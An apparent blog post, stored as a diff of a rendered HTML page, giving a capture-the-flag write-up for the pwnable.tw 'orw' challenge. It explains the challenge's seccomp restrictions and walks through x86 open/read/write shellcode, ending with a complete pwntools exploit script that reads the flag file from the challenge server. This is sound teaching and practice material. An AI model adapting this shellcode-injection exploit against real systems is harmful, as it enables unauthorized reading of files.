@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Let&rsquo;s have a quick and succinct write-up for orw - a challenge at pwnable.tw.
+Footprinting Initially, we want to check the file for any notable properties (PIE, Canary, RELRO, etc.).
+Based on the output above, there are no protection bits enabled within the binary (except for canary but it does not interfere with our payload afterwards) and therefore it is presumably believed to be quite simple as expected for a 100pts challenge.">  
+
+  <title>
+    
+      Pwnable.tw: orw
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2022-05-07 09:30:00 &#43;1345 &#43;1345">
+            2022-05-07
+        </time>
+    </p>
+
+    <h1>Pwnable.tw: orw</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#footprinting">Footprinting</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#sys_open---0x5">SYS_open - 0x5</a></li>
+        <li><a href="#sys_read---0x3">SYS_read - 0x3</a></li>
+        <li><a href="#sys_write---0x4">SYS_write - 0x4</a></li>
+      </ul>
+    </li>
+    <li><a href="#solvepy">Solve.py</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>Let&rsquo;s have a quick and succinct write-up for <strong>orw</strong> - a challenge at <a href="/">pwnable.tw</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_20-07.png"></p>
+<h2 id="footprinting"><a class="h-anchor" href="#footprinting">Footprinting</a></h2>
+<p>Initially, we want to check the file for any notable properties (PIE, Canary, RELRO, etc.).</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-24.png"></p>
+<p>Based on the output above, there are no protection bits enabled within the binary (except for canary but it does not interfere with our payload afterwards) and therefore it is presumably believed to be quite simple as expected for a 100pts challenge.</p>
+<p>For now, we shall have a look into the disassembly code of <code>orw</code>:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-33.png"></p>
+<p>What the program does is rather straightforward, as it:</p>
+<ul>
+<li>calls <code>orw_seccomp</code> which basically allows only <code>SYS_open</code>, <code>SYS_read</code> and <code>SYS_write</code> to be executed thus limited our capability of calling low hanging fruit syscalls like <code>execve</code>, <code>system</code> or such</li>
+<li>reads input from STDIN (<code>SYS_read</code> with 200 bytes limit) and executes whatever it is as shellcode</li>
+</ul>
+<p>That being said, the author simply asks us to practice writing assembly and interacting with given syscalls.</p>
+<h2 id="solution"><a class="h-anchor" href="#solution">Solution</a></h2>
+<p>According to what we have discussed, our shellcode needs to call <code>SYS_open</code> to open the flag at <code>/home/orw/flag</code>, then reads the content therein with <code>SYS_read</code> and finally pipe it to STDOUT using <code>SYS_write</code>. Keep in mind that syscalls have their own dedicated <em>ID</em>, herein <code>0x5</code>, <code>0x3</code>, <code>0x4</code> for <code>open</code>, <code>read</code> and <code>write</code>, respectively.</p>
+<p>You can read more about Linux syscalls and their respective assembly <a href="https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm">here</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_22-03.png"></p>
+<p>To call a syscall, simply push its ID into <code>EAX</code> then ask <code>INT</code> to execute it.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov eax, 0x1	; 0x1 - SYS_exit
+int 0x80		; call it
+</code></pre><h3 id="sys_open---0x5"><a class="h-anchor" href="#sys_open---0x5">SYS_open - 0x5</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">open</span>(<span style="color:#f00">const</span> <span style="color:#ee82ee">char</span> *pathname, <span style="color:#ee82ee">int</span> flags, <span style="color:#ee82ee">mode_t</span> mode);
+</span></span></code></pre></div><p>As demonstrated in the table and the syntax listed, <code>SYS_open</code> takes <code>ebx</code> as its filename, <code>ecx</code> as open access mode and <code>edx</code> as file permission. We thus need:</p>
+<ul>
+<li><code>EBX</code> holds the value of <code>/home/orw/flag</code></li>
+<li><code>ECX</code> could be <code>0</code> (<code>O_RDONLY</code> flag)</li>
+<li><code>EDX</code> is not necessary since it is a optional argument, we should leave it as <code>0</code></li>
+</ul>
+<p>Our shellcode for this syscall shall as follows:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">push 0x6761		; ag
+push 0x6c662f77 ; w/fl
+push 0x726f2f65	; e/or
+push 0x6d6f682f	; /hom
+mov ebx, esp	; ESP now has the path /home/orw/flag
+xor ecx, ecx	; O_RDONLY
+xor edx, edx	; NULL
+mov eax, 0x5 	; SYS_open(ebp, ecx, edx)
+int 0x80
+</code></pre><p><strong>Note:</strong> It is not feasible to push the whole string <code>/home/orw/flag</code> but a 8-byte value onto the stack at once since the program is speaking x32 and that is the reason why we have to divide the string into four separate parts. Follow <a href="https://c9x.me/x86/html/file_module_x86_id_269.html">this link</a> for more information about PUSH instruction.</p>
+<p>You can convert the string in reverse using this recipe in <a href="https://gchq.github.io/CyberChef/#recipe=Reverse('Character')To_Hex('None',8)&input=L2hvbQ">CyberChef</a>:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-21.png"></p>
+<h3 id="sys_read---0x3"><a class="h-anchor" href="#sys_read---0x3">SYS_read - 0x3</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">ssize_t</span> <span style="color:#ff0">read</span>(<span style="color:#ee82ee">int</span> fd, <span style="color:#ee82ee">void</span> *buf, <span style="color:#ee82ee">size_t</span> count);
+</span></span></code></pre></div><p>Follows the table and <code>read</code>&rsquo;s syntax:</p>
+<ul>
+<li><code>EBX</code> is now our file handle returned from <code>SYS_open</code> and stored in <code>EAX</code></li>
+<li><code>ECX</code> holds the buffer for the flag, it could point to any string register dubbed <code>ESI</code>, <code>EDI</code> or even <code>ESP</code></li>
+<li><code>EDX</code> is the maximum bytes our buffer shall have, <code>0x50</code> should be enough for the flag</li>
+</ul>
+<p>And we have the shellcode for <code>SYS_read</code>:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">; ...
+mov ebx, eax	; eax has the handle of our file
+mov ecx, esp	; ecx now points to esp and uses it as the buffer
+mov edx, 0x50	; ... of 0x50 bytes in size
+mov eax, 0x3	; SYS_read(ebx, ecx, edx)
+int 0x80			
+</code></pre><h3 id="sys_write---0x4"><a class="h-anchor" href="#sys_write---0x4">SYS_write - 0x4</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">ssize_t</span> <span style="color:#ff0">write</span>(<span style="color:#ee82ee">int</span> fd, <span style="color:#f00">const</span> <span style="color:#ee82ee">void</span> *buf, <span style="color:#ee82ee">size_t</span> count);
+</span></span></code></pre></div><p>Same with those two above, we adhere to the table and its syntax:</p>
+<ul>
+<li><code>EBX</code> is file descriptor which indicates where the program would write and the register&rsquo;s value should be <code>1</code> - pipe directly to STDOUT</li>
+<li><code>ECX</code> needs to point to our flag and it is currently in <code>ESP</code> so we shall have it as that</li>
+<li><code>EDX</code> is the number of bytes to be written which returned from <code>SYS_read</code>, therefore it should be <code>EDX -&gt; EAX</code></li>
+</ul>
+<p>Our shellcode:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">; ...
+mov edx, eax	; byte_written = eax
+mov ebx, 0x1	; stdout
+mov ecx, esp	; flag&#39;s buffer
+mov eax, 0x4	; SYS_write
+int 0x80
+</code></pre><h2 id="solvepy"><a class="h-anchor" href="#solvepy">Solve.py</a></h2>
+<p>In this final step, gather them all in one place - <code>solve.py</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf = context.binary = ELF(<span style="color:#87ceeb">&#39;./orw&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#p = process([elf.path])</span>
+</span></span><span style="display:flex;"><span>p = remote(<span style="color:#87ceeb">&#39;chall.pwnable.tw&#39;</span>, <span style="color:#f60">10001</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload = asm(
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        push 0x6761
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        push 0x6c662f77
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        push 0x726f2f65
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        push 0x6d6f682f
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov ebx, esp
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        xor ecx, ecx
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        xor edx, edx
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov eax, 0x5
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        int 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov ebx, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov ecx, esp
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov edx, 0x50
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov eax, 0x3
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        int 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov ecx, esp
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov edx, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov ebx, 0x1
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        mov eax, 0x4
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        int 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        push 0x1
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        pop eax
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">        int 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#87ceeb">    &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;Payload size: </span><span style="color:#87ceeb">{</span>len(payload)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#39;</span>)  <span style="color:#0f0"># just to make sure our payload won&#39;t exceed 200 bytes limit</span>
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div><p>The script shows that our payload has the size of 70 bytes and we have the flag subsequently. It is still worth mentioning that we can reduce the size of the payload by replacing <code>mov</code>  with <code>push; pop</code> instruction since the latter two only consist of 3 bytes in total whereas <code>mov</code> is of 5-bytes itself.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-28.png"></p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
